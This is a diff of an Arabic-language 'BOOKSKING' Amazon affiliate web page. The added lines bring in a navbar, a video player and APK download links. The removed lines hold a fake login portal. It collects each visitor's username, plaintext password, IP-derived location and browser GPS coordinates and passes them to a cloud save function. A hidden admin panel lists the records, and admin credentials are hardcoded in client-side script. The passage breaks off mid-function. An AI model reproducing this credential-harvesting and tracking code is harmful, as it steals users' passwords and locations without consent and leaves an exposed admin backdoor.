@@ -3,28 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BOOKSKING Royal Elite Mega Store - Ultra Modern</title>
+    <title>BOOKSKING Royal Elite Mega Hub - Perfect Final Edition</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         :root {
             --bg-color: #030712;
-            --card-bg: rgba(17, 24, 39, 0.75);
-            --border-color: rgba(243, 156, 18, 0.3);
+            --card-bg: rgba(17, 24, 39, 0.9);
+            --border-color: rgba(243, 156, 18, 0.4);
             --gold-color: #f39c12;
             --gold-hover: #e67e22;
             --text-main: #f8fafc;
             --text-muted: #94a3b8;
             --success-color: #2ecc71;
             --accent-red: #e74c3c;
-            --card-hover: rgba(30, 41, 59, 0.9);
-            --shadow-color: rgba(0, 0, 0, 0.5);
+            --card-hover: rgba(30, 41, 59, 0.95);
+            --shadow-color: rgba(0, 0, 0, 0.6);
         }
 
         [data-theme="light"] {
             --bg-color: #f1f5f9;
-            --card-bg: rgba(255, 255, 255, 0.85);
-            --border-color: rgba(217, 119, 6, 0.4);
+            --card-bg: rgba(255, 255, 255, 0.95);
+            --border-color: rgba(217, 119, 6, 0.5);
             --gold-color: #d97706;
             --gold-hover: #b45309;
             --text-main: #0f172a;
@@ -32,10 +32,10 @@
             --success-color: #16a34a;
             --accent-red: #dc2626;
             --card-hover: rgba(255, 255, 255, 1);
-            --shadow-color: rgba(0, 0, 0, 0.08);
+            --shadow-color: rgba(0, 0, 0, 0.1);
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; transition: background-color 0.2s ease, color 0.2s ease, border-color 0.2s ease; }
         
         body { 
             background-color: var(--bg-color); 
@@ -44,331 +44,329 @@
             flex-direction: column; 
             align-items: center; 
             min-height: 100vh; 
-            padding: 20px; 
-            will-change: transform;
-            transform: translateZ(0);
-            backface-visibility: hidden;
-            -webkit-font-smoothing: antialiased;
+            padding: 15px; 
+            padding-top: 75px;
         }
 
-        .wrapper { width: 100%; max-width: 600px; position: relative; }
-
-        /* Modern Theme Toggle Floating Button */
-        .theme-toggle-btn {
+        /* Top Navbar */
+        .top-navbar {
             position: fixed;
-            top: 20px;
-            right: 20px;
+            top: 0; left: 0; width: 100%;
             background: var(--card-bg);
+            border-bottom: 2px solid var(--gold-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            z-index: 999;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 4px 20px var(--shadow-color);
+        }
+        .nav-brand { color: var(--gold-color); font-weight: 900; font-size: 18px; text-decoration: none; letter-spacing: 0.5px; }
+
+        .menu-toggle-btn {
+            background: var(--bg-color);
             border: 2px solid var(--gold-color);
             color: var(--gold-color);
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
+            font-size: 20px;
+            font-weight: bold;
+            width: 40px; height: 40px;
+            border-radius: 10px;
+            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px var(--shadow-color);
-            z-index: 1000;
-            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 10px var(--shadow-color);
         }
-        .theme-toggle-btn:active { transform: scale(0.9); }
+        .menu-toggle-btn:active { transform: scale(0.92); }
+
+        /* Side Drawer */
+        .side-drawer {
+            position: fixed;
+            top: 0; right: -300px; width: 300px; height: 100%;
+            background: var(--card-bg);
+            border-left: 2px solid var(--gold-color);
+            z-index: 1001;
+            box-shadow: -10px 0 30px var(--shadow-color);
+            backdrop-filter: blur(15px);
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            transition: right 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .side-drawer.open { right: 0; }
+        
+        .drawer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+            color: var(--gold-color);
+            font-weight: 800;
+            font-size: 16px;
+        }
+        .close-drawer-btn { background: none; border: none; color: var(--text-muted); font-size: 22px; cursor: pointer; }
+        .close-drawer-btn:hover { color: var(--accent-red); }
+
+        .drawer-links-list { display: flex; flex-direction: column; gap: 9px; overflow-y: auto; max-height: calc(100vh - 100px); padding-right: 4px; }
+        .drawer-link-item {
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 11px 14px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 700;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .drawer-link-item:hover { border-color: var(--gold-color); color: var(--gold-color); background: var(--card-hover); transform: translateX(-3px); }
+        .drawer-special-item { border-color: var(--success-color); color: var(--success-color); }
+        .drawer-group-item { border-color: #3b82f6; color: #60a5fa; }
+
+        .drawer-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            display: none;
+            backdrop-filter: blur(3px);
+        }
+        .drawer-overlay.active { display: block; }
+
+        .wrapper { width: 100%; max-width: 650px; position: relative; }
+
+        .theme-toggle-btn {
+            position: fixed;
+            bottom: 20px; right: 20px;
+            background: var(--card-bg);
+            border: 2px solid var(--gold-color);
+            color: var(--gold-color);
+            width: 50px; height: 50px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 22px; cursor: pointer;
+            box-shadow: 0 6px 20px var(--shadow-color);
+            z-index: 1000;
+        }
 
         .hero-banner { 
             background: linear-gradient(135deg, var(--card-bg), var(--bg-color)); 
             border: 2px solid var(--gold-color); 
-            border-radius: 20px; 
-            padding: 25px; 
-            margin-bottom: 25px; 
-            box-shadow: 0 10px 30px var(--shadow-color); 
+            border-radius: 18px; 
+            padding: 20px; 
+            margin-bottom: 15px; 
             text-align: center; 
-            backdrop-filter: blur(12px);
         }
-        .brand-title { color: var(--gold-color); font-size: 24px; font-weight: 800; letter-spacing: 1px; line-height: 1.3; text-shadow: 0 2px 10px rgba(243, 156, 18, 0.2); }
+        .brand-title { color: var(--gold-color); font-size: 22px; font-weight: 800; margin-bottom: 5px; }
+        .brand-subtitle { font-size: 12px; color: var(--text-muted); }
+
+        .live-ticker {
+            background: rgba(243, 156, 18, 0.1);
+            border: 1px dashed var(--gold-color);
+            padding: 8px 12px;
+            border-radius: 10px;
+            font-size: 12px;
+            color: var(--gold-color);
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 15px;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        .smart-search-box { display: flex; gap: 8px; margin-bottom: 18px; }
+        .smart-search-box input {
+            flex: 1; padding: 12px 15px;
+            background: var(--card-bg); border: 1px solid var(--border-color);
+            border-radius: 12px; color: var(--text-main); font-size: 13px; outline: none;
+        }
+        .smart-search-box input:focus { border-color: var(--gold-color); }
+        .search-btn {
+            background: var(--gold-color); border: none; color: #030712;
+            padding: 0 16px; border-radius: 12px; font-weight: bold; cursor: pointer;
+        }
 
         .section-card { 
             background-color: var(--card-bg); 
             border: 1px solid var(--border-color); 
-            border-radius: 20px; 
-            padding: 20px; 
-            margin-bottom: 20px; 
-            box-shadow: 0 8px 25px var(--shadow-color); 
-            backdrop-filter: blur(12px);
+            border-radius: 18px; 
+            padding: 18px; 
+            margin-bottom: 18px; 
         }
-        .section-header { text-align: center; font-size: 18px; margin-bottom: 15px; color: var(--gold-color); font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+        .section-header { text-align: center; font-size: 17px; margin-bottom: 12px; color: var(--gold-color); font-weight: 700; text-transform: uppercase; }
 
-        .departments-grid { 
-            display: grid; 
-            grid-template-columns: repeat(2, 1fr); 
-            gap: 12px; 
-            max-height: 320px; 
-            overflow-y: auto; 
-            padding: 5px; 
-            border: 1px solid var(--border-color); 
-            border-radius: 12px; 
-            background: rgba(0, 0, 0, 0.03); 
-            scroll-behavior: smooth;
-            -webkit-overflow-scrolling: touch;
+        /* Custom Video Player */
+        .custom-video-hub {
+            background: #000; border: 2px solid var(--gold-color);
+            border-radius: 14px; overflow: hidden; margin-bottom: 12px;
         }
+        .player-screen { position: relative; width: 100%; padding-bottom: 56.25%; background: #0b0f19; }
+        .player-screen video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
+        .player-controls-bar {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 10px 15px; background: rgba(15, 23, 42, 0.95); border-top: 1px solid var(--border-color);
+        }
+        .player-title-display { font-size: 12px; color: var(--gold-color); font-weight: bold; }
+        .control-btn {
+            background: var(--bg-color); border: 1px solid var(--border-color);
+            color: var(--text-main); padding: 6px 12px; border-radius: 6px; font-size: 11px; cursor: pointer; font-weight: bold;
+        }
+        .control-btn:hover { border-color: var(--gold-color); color: var(--gold-color); }
+        .video-playlist-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 10px; }
+        .playlist-item {
+            background-color: var(--bg-color); border: 1px solid var(--border-color);
+            color: var(--text-main); padding: 10px; border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer; text-align: center;
+        }
+        .playlist-item:hover { border-color: var(--gold-color); color: var(--gold-color); }
 
+        /* APK Apps Center */
+        .apk-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 10px; }
+        .apk-card {
+            background: var(--bg-color); border: 1px solid var(--border-color);
+            padding: 12px; border-radius: 12px; text-align: center; font-size: 12px; font-weight: bold;
+        }
+        .apk-card a { color: var(--success-color); text-decoration: none; display: block; margin-top: 6px; font-size: 11px; }
+
+        /* Departments */
+        .departments-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; max-height: 220px; overflow-y: auto; padding: 5px; border: 1px solid var(--border-color); border-radius: 12px; }
         .dept-item { 
-            background-color: var(--card-bg); 
-            border: 1px solid var(--border-color); 
-            border-radius: 12px; 
-            padding: 14px; 
-            color: var(--gold-color); 
-            font-size: 12px; 
-            font-weight: 700; 
-            text-align: center; 
-            cursor: pointer; 
-            transition: all 0.25s ease; 
-            text-decoration: none; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center;
-            box-shadow: 0 4px 12px var(--shadow-color);
+            background-color: var(--card-bg); border: 1px solid var(--border-color); 
+            border-radius: 10px; padding: 12px; color: var(--gold-color); font-size: 12px; font-weight: 700; text-align: center; text-decoration: none; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
-        .dept-item:hover { border-color: var(--gold-color); background-color: var(--card-hover); transform: translateY(-3px); }
+        .dept-item:hover { border-color: var(--gold-color); background-color: var(--card-hover); }
         .dept-special { border-color: var(--accent-red); color: var(--accent-red); }
 
-        .input-box { margin-bottom: 15px; }
-        .input-box label { display: block; margin-bottom: 6px; font-size: 13px; color: var(--text-muted); font-weight: 600; }
+        /* Login & Auth */
+        .google-auth-btn {
+            width: 100%; padding: 13px; background-color: #ffffff; color: #0f172a;
+            border: 1px solid #cbd5e1; border-radius: 12px; font-weight: 700; font-size: 14px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 15px;
+        }
+        .divider { text-align: center; border-bottom: 1px solid var(--border-color); line-height: 0.1em; margin: 18px 0; font-size: 12px; color: var(--text-muted); }
+        .divider span { background: var(--card-bg); padding: 0 10px; }
+        .input-box { margin-bottom: 14px; }
+        .input-box label { display: block; margin-bottom: 5px; font-size: 13px; color: var(--text-muted); font-weight: 600; }
         .input-box input { 
-            width: 100%; 
-            padding: 14px; 
-            background-color: var(--bg-color); 
-            border: 1px solid var(--border-color); 
-            border-radius: 12px; 
-            color: var(--text-main); 
-            font-size: 14px; 
-            outline: none; 
-            box-shadow: inset 0 2px 4px var(--shadow-color);
+            width: 100%; padding: 13px; background-color: var(--bg-color); 
+            border: 1px solid var(--border-color); border-radius: 12px; color: var(--text-main); font-size: 14px; outline: none; 
         }
-        .input-box input:focus { border-color: var(--gold-color); box-shadow: 0 0 10px rgba(243, 156, 18, 0.3); }
-
+        .input-box input:focus { border-color: var(--gold-color); }
         .royal-btn { 
-            width: 100%; 
-            padding: 15px; 
-            background: linear-gradient(135deg, var(--gold-color), var(--gold-hover)); 
-            border: none; 
-            border-radius: 12px; 
-            color: #030712; 
-            font-weight: 800; 
-            font-size: 15px; 
-            cursor: pointer; 
-            text-transform: uppercase; 
-            transition: 0.25s ease; 
-            box-shadow: 0 6px 20px rgba(243, 156, 18, 0.4); 
+            width: 100%; padding: 14px; background: linear-gradient(135deg, var(--gold-color), var(--gold-hover)); 
+            border: none; border-radius: 12px; color: #030712; font-weight: 800; font-size: 15px; cursor: pointer; text-transform: uppercase; 
         }
-        .royal-btn:active { transform: scale(0.98); }
-
-        .security-banner { background-color: var(--bg-color); border: 1px solid var(--success-color); color: var(--success-color); padding: 12px; border-radius: 10px; font-size: 12px; text-align: center; margin-bottom: 15px; font-weight: 700; box-shadow: 0 2px 8px var(--shadow-color); }
+        .security-banner { background-color: var(--bg-color); border: 1px solid var(--success-color); color: var(--success-color); padding: 10px; border-radius: 10px; font-size: 12px; text-align: center; margin-bottom: 12px; font-weight: 700; }
         
-        /* Master Admin Control Panel Styles */
-        .admin-dashboard { background-color: var(--bg-color); border: 2px solid var(--gold-color); border-radius: 16px; padding: 20px; margin-top: 20px; display: none; box-shadow: 0 10px 30px var(--shadow-color); }
-        .admin-heading { color: var(--gold-color); font-weight: 800; margin-bottom: 15px; font-size: 18px; text-align: center; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
-        .admin-stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; text-align: center; }
-        .stat-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 12px; box-shadow: 0 4px 12px var(--shadow-color); }
-        .stat-num { color: var(--gold-color); font-size: 16px; font-weight: bold; margin-top: 5px; }
-        .user-record { background-color: var(--card-bg); padding: 14px; border-radius: 12px; margin-bottom: 12px; font-size: 12px; border: 1px solid var(--border-color); line-height: 1.6; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 12px var(--shadow-color); }
-        .user-record:hover { border-color: var(--gold-color); }
-        .selected-badge { text-align: center; font-size: 13px; color: var(--success-color); margin-top: 12px; font-weight: bold; }
+        /* Admin Dashboard */
+        .admin-dashboard { background-color: var(--card-bg); border: 2px solid var(--gold-color); border-radius: 18px; padding: 20px; margin-top: 20px; display: none; }
+        .admin-heading { color: var(--gold-color); font-weight: 800; margin-bottom: 15px; font-size: 19px; text-align: center; border-bottom: 2px solid var(--border-color); padding-bottom: 12px; }
+        .admin-stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 18px; text-align: center; }
+        .stat-card { background: var(--bg-color); border: 1px solid var(--border-color); border-radius: 12px; padding: 14px; }
+        .stat-num { color: var(--gold-color); font-size: 18px; font-weight: bold; margin-top: 6px; }
+        .large-records-container { max-height: 400px; overflow-y: auto; }
+        .user-record { background-color: var(--bg-color); padding: 15px; border-radius: 12px; margin-bottom: 12px; font-size: 13px; border: 1px solid var(--border-color); line-height: 1.6; }
+        .selected-badge { text-align: center; font-size: 13px; color: var(--success-color); margin-top: 10px; font-weight: bold; }
     </style>
 </head>
 <body data-theme="dark">
 
-    <!-- Real Dynamic Theme Switcher Button -->
-    <button class="theme-toggle-btn" id="themeToggleBtn" onclick="toggleAppTheme()">☀️</button>
+    <header class="top-navbar">
+        <a href="#" class="nav-brand">👑 BOOKSKING</a>
+        <button class="menu-toggle-btn" onclick="toggleSidebarMenu()">⋮</button>
+    </header>
 
-    <div class="wrapper">
-        <!-- Hero Header -->
-        <div class="hero-banner">
-            <div class="brand-title">
-                BOOKSKING MEGA HUB 👑<br><span style="font-size: 13px; color: var(--text-muted); font-weight: normal;">Global Amazon Elite Store & Digital Library</span>
-            </div>
+    <div class="drawer-overlay" id="drawerOverlay" onclick="toggleSidebarMenu()"></div>
+
+    <!-- Side Drawer -->
+    <div class="side-drawer" id="sideDrawer">
+        <div class="drawer-header">
+            <span>🌐 القائمة الملكية الشاملة</span>
+            <button class="close-drawer-btn" onclick="toggleSidebarMenu()">✕</button>
         </div>
-
-        <!-- Comprehensive General Departments Hub -->
-        <div class="section-card">
-            <div class="section-header">🛍️ أقسام أمازون المميزة (وصول مباشر)</div>
-            <div class="departments-grid">
-                <a href="https://www.amazon.com/s?k=lightning+deals+today&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('العروض والخصومات الحصرية')">⚡ العروض والخصومات الحصرية</a>
-                <a href="https://www.amazon.com/b?node=154606011&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('الكتب الإلكترونية - Kindle')">📖 الكتب الإلكترونية (Kindle)</a>
-                <a href="https://www.amazon.com/s?k=digital+pdf+books+educational&tag=booksking-20" target="_blank" class="dept-item dept-special" onclick="recordDeptClick('المراجع وكتب الـ PDF')">📑 المراجع وكتب الـ PDF</a>
-                
-                <a href="https://www.amazon.com/s?k=home+video+game+consoles+playstation+xbox+nintendo&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('أجهزة الكونسول والألعاب المنزلية')">🕹️ أجهزة الكونسول والألعاب</a>
-                <a href="https://www.amazon.com/s?k=electronics+laptops+smartphones+gadgets&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الأجهزة الإلكترونية والذكية')">💻 الإلكترونيات والأجهزة الذكية</a>
-                <a href="https://www.amazon.com/s?k=shoes+footwear+men+women&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الأحذية والأزياء')">👟 الأحذية والأزياء</a>
-                <a href="https://www.amazon.com/s?k=trending+fashion+clothing&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الملابس والموضة')">👕 الملابس والموضة</a>
-                <a href="https://www.amazon.com/s?k=luxury+wrist+watches+men+women&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الساعات الفاخرة والاكسسوارات')">⌚ الساعات والاكسسوارات</a>
-                <a href="https://www.amazon.com/s?k=bestselling+luxury+perfumes&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('العطور والروائح الفاخرة')">🌸 العطور والروائح الفاخرة</a>
-                <a href="https://www.amazon.com/s?k=professional+cosmetics+makeup&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('مستحضرات التجميل والعناية')">💄 مستحضرات التجميل والعناية</a>
-                <a href="https://www.amazon.com/s?k=smart+home+appliances&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الأجهزة المنزلية الذكية')">🏠 الأجهزة المنزلية الذكية</a>
-                <a href="https://www.amazon.com/s?k=home+gym+fitness+equipment&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الرياضة واللياقة البدنية')">⚽ الرياضة واللياقة البدنية</a>
-                <a href="https://www.amazon.com/s?k=bestselling+books+novels&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الكتب والروايات المطبوعة')">📚 الكتب والروايات المطبوعة</a>
-                <a href="https://www.amazon.com/s?k=modern+kitchenware+gadgets&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('أدوات ومستلزمات المطبخ')">🍳 أدوات ومستلزمات المطبخ</a>
-                <a href="https://www.amazon.com/s?k=aesthetic+home+decor+furniture&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الديكور والأثاث المنزلي')">🛋️ الديكور والأثاث المنزلي</a>
-                <a href="https://www.amazon.com/s?k=popular+toys+and+hobbies&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الألعاب والهوايات')">🧸 الألعاب والهوايات</a>
-                <a href="https://www.amazon.com/s?k=car+electronics+accessories&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('إلكترونيات ومستلزمات السيارات')">🚗 مستلزمات السيارات</a>
-                <a href="https://www.amazon.com/s?k=premium+office+supplies+stationery&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('الادوات المكتبية والمدرسية')">✏️ الأدوات المكتبية والمدرسية</a>
-                <a href="https://www.amazon.com/s?k=designer+polarized+sunglasses&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('النظارات الشمسية')">🕶️ النظارات الشمسية</a>
-                <a href="https://www.amazon.com/s?k=gourmet+food+beverages&tag=booksking-20" target="_blank" class="dept-item" onclick="recordDeptClick('المأكولات والمشروبات')">🍏 المأكولات والمشروبات</a>
-            </div>
-            <div class="selected-badge" id="active-dept-label">القسم المختار: لا يوجد (تصفح عام)</div>
-        </div>
-
-        <!-- Realistic Login Portal -->
-        <div class="section-card" id="auth-section">
-            <div class="security-banner">🛡️ بوابة تسجيل الدخول وإنشاء الحساب</div>
-            <div class="section-header">تسجيل الدخول / إنشاء حساب</div>
-            <div class="input-box">
-                <label>اسم المستخدم للحساب</label>
-                <input type="text" id="username" placeholder="أدخل اسم المستخدم">
-            </div>
-            <div class="input-box">
-                <label>كلمة المرور</label>
-                <input type="password" id="password" placeholder="أدخل كلمة المرور">
-            </div>
-            <button class="royal-btn" onclick="executeRealisticLogin()">تسجيل الدخول / إنشاء الحساب</button>
-        </div>
-
-        <!-- Master Admin Control Panel -->
-        <div class="admin-dashboard" id="adminPanel">
-            <div class="admin-heading">👑 لوحة تحكم المدير العام (سرية)</div>
-            <div class="admin-stats-grid">
-                <div class="stat-card">
-                    <div style="font-size: 10px; color: var(--text-muted);">الزوار الحقيقيون</div>
-                    <div class="stat-num" id="stat-visitors">0</div>
-                </div>
-                <div class="stat-card">
-                    <div style="font-size: 10px; color: var(--text-muted);">إجمالي الحسابات</div>
-                    <div class="stat-num" id="stat-accounts">0</div>
-                </div>
-                <div class="stat-card">
-                    <div style="font-size: 10px; color: var(--text-muted);">حالة النظام</div>
-                    <div class="stat-num" style="color:var(--success-color);">آمن 100%</div>
-                </div>
-            </div>
-            <div class="section-header" style="font-size: 14px; margin-top: 15px;">سجلات الحسابات والبيانات المسجلة</div>
-            <div id="usersList">جاري جلب السجلات الآمنة...</div>
+        <div class="drawer-links-list">
+            <a href="https://www.youtube.com" target="_blank" class="drawer-link-item" onclick="recordDeptClick('يوتيوب')">📺 يوتيوب</a>
+            <a href="https://www.facebook.com" target="_blank" class="drawer-link-item" onclick="recordDeptClick('فيسبوك')">📘 فيسبوك</a>
+            <a href="https://www.tiktok.com" target="_blank" class="drawer-link-item" onclick="recordDeptClick('تيك توك')">🎵 تيك توك</a>
+            <a href="https://www.amazon.com?tag=booksking-20" target="_blank" class="drawer-link-item" onclick="recordDeptClick('أمازون')">🛒 أمازون</a>
+            <a href="https://gemini.google.com" target="_blank" class="drawer-link-item" onclick="recordDeptClick('Gemini AI')">✨ الذكاء الاصطناعي (Gemini)</a>
+            <a href="https://chatgpt.com" target="_blank" class="drawer-link-item" onclick="recordDeptClick('ChatGPT')">🤖 روبوت ChatGPT</a>
+            <a href="https://www.google.com" target="_blank" class="drawer-link-item" onclick="recordDeptClick('جوجل')">🌐 محرك بحث جوجل</a>
+            <a href="https://www.snaptubeapp.com" target="_blank" class="drawer-link-item drawer-special-item" onclick="recordDeptClick('Snaptube')">📥 قسم التحميل (Snaptube)</a>
+            <a href="https://github.com" target="_blank" class="drawer-link-item" onclick="recordDeptClick('GitHub')">🐙 مستودع GitHub</a>
+            <!-- جروب التواصل الصغير للتحدث معك -->
+            <a href="https://t.me/YourGroupLinkHere" target="_blank" class="drawer-link-item drawer-group-item" onclick="recordDeptClick('جروب التواصل')">💬 انضم لجروب التواصل الخاص بنا</a>
         </div>
     </div>
 
-    <script>
-        const firebaseConfig = {
-            databaseURL: "https://booksking-default-rtdb.firebaseio.com/"
-        };
-        
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
-        const db = firebase.database();
+    <button class="theme-toggle-btn" id="themeToggleBtn" onclick="toggleAppTheme()">☀️</button>
 
-        let visitorIp = "Unknown IP";
-        let visitorCountry = "Unknown Country";
-        let visitorCity = "Unknown City";
-        let currentDept = "تصفح عام";
+    <div class="wrapper">
+        <div class="hero-banner">
+            <div class="brand-title">BOOKSKING MEGA HUB 👑</div>
+            <div class="brand-subtitle">المنصة الملكية المتكاملة للتسويق، البث، والأدوات الذكية</div>
+        </div>
 
-        // Real Interactive Theme Switcher Logic
-        function toggleAppTheme() {
-            const bodyElement = document.body;
-            const themeBtn = document.getElementById("themeToggleBtn");
-            const currentTheme = bodyElement.getAttribute("data-theme");
+        <div class="live-ticker">
+            ⚡ أهلاً بك في BOOKSKING | تصفح المنصات، أدوات التحميل، وتطبيقات الأندرويد المباشرة!
+        </div>
 
-            if (currentTheme === "dark") {
-                bodyElement.setAttribute("data-theme", "light");
-                themeBtn.innerText = "🌙";
-            } else {
-                bodyElement.setAttribute("data-theme", "dark");
-                themeBtn.innerText = "☀️";
-            }
-        }
+        <div class="smart-search-box">
+            <input type="text" id="smartSearchInput" placeholder="ابحث عن كتاب، منتج في أمازون، أو تطبيق...">
+            <button class="search-btn" onclick="executeSmartSearch()">بحث 🔍</button>
+        </div>
 
-        function recordDeptClick(deptName) {
-            currentDept = deptName;
-            document.getElementById("active-dept-label").innerText = "القسم المختار: " + deptName + " (رابط مباشر من أمازون)";
-        }
+        <!-- Video Player Section -->
+        <div class="section-card">
+            <div class="section-header">🎬 مشغل فيديوهات المنصة الخاصة</div>
+            <div class="custom-video-hub">
+                <div class="player-screen">
+                    <video id="royalVideoElement" poster="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800&auto=format&fit=crop&q=60">
+                        <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
+                    </video>
+                </div>
+                <div class="player-controls-bar">
+                    <div class="player-title-display" id="currentVideoTitle">العرض الترويجي: Big Buck Bunny</div>
+                    <div style="display:flex; gap:6px;">
+                        <button class="control-btn" onclick="togglePlayPause()" id="playPauseBtn">⏸️ إيقاف</button>
+                        <button class="control-btn" onclick="toggleMute()" id="muteBtn">🔊 كتم</button>
+                    </div>
+                </div>
+            </div>
+            <div class="video-playlist-grid">
+                <button class="playlist-item" onclick="switchCustomVideo('https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4', 'العرض الترويجي: Big Buck Bunny')">▶️ فيديو 1</button>
+                <button class="playlist-item" onclick="switchCustomVideo('https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4', 'عرض الجرافيك: Elephant Dream')">▶️ فيديو 2</button>
+                <button class="playlist-item" onclick="switchCustomVideo('https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4', 'تشويقي: For Bigger Blazes')">▶️ فيديو 3</button>
+            </div>
+        </div>
 
-        async function fetchNetworkDetails() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                if (data.ip) {
-                    visitorIp = data.ip;
-                    visitorCountry = data.country_name || "Unknown";
-                    visitorCity = data.city || "Unknown";
-                }
-            } catch (error) {
-                console.log("Network fallback active");
-            }
-        }
-        fetchNetworkDetails();
+        <!-- APK Apps Download Section -->
+        <div class="section-card">
+            <div class="section-header">📱 قسم تحميل تطبيقات الـ APK</div>
+            <div class="apk-grid">
+                <div class="apk-card">
+                    <span>🔥 تطبيق Snaptube APK</span>
+                    <a href="https://www.snaptubeapp.com" target="_blank" onclick="recordDeptClick('تحميل Snaptube APK')">تحميل مباشر 📥</a>
+                </div>
+                <div class="apk-card">
+                    <span>👑 تطبيق BOOKSKING Hub</span>
+                    <a href="#" onclick="alert('سيكون متاحاً قريباً يا بشمهندس!'); recordDeptClick('تحميل تطبيق المنصة')">تحميل مباشر 📥</a>
+                </div>
+            </div>
+        </div>
 
-        const visitorCounterRef = db.ref("stats/totalVisitorsCount");
-        const sessionKey = sessionStorage.getItem("visitor_counted");
-        if (!sessionKey) {
-            visitorCounterRef.transaction((currentCount) => {
-                return (currentCount || 0) + 1;
-            });
-            sessionStorage.setItem("visitor_counted", "true");
-        }
-
-        visitorCounterRef.on("value", (snapshot) => {
-            document.getElementById("stat-visitors").innerText = snapshot.val() || 0;
-        });
-
-        function executeRealisticLogin() {
-            const usernameInput = document.getElementById("username").value.trim();
-            const passwordInput = document.getElementById("password").value.trim();
-
-            if(!usernameInput || !passwordInput) {
-                alert("خطأ: يجب إدخال اسم المستخدم وكلمة المرور!");
-                return;
-            }
-
-            const masterAdminUser = "👑_BOOKSKING_ELITE_SUPER_MASTER_2026_SECURE_99#";
-            const masterAdminPass = "!&Xz9#mP$7vLqK*2wR@8tY#5$SuperSecureMasterKey2026!Key";
-
-            if (usernameInput === masterAdminUser && passwordInput === masterAdminPass) {
-                document.getElementById("adminPanel").style.display = "block";
-                activateMasterAdminDashboard();
-                alert("تم تسجيل الدخول بنجاح: أهلاً بك يا رئيس النظام.");
-                return;
-            }
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        saveRecordToCloud(usernameInput, passwordInput, `${visitorCountry}, ${visitorCity} (GPS: ${latitude.toFixed(4)}, ${longitude.toFixed(4)})`);
-                    },
-                    (error) => {
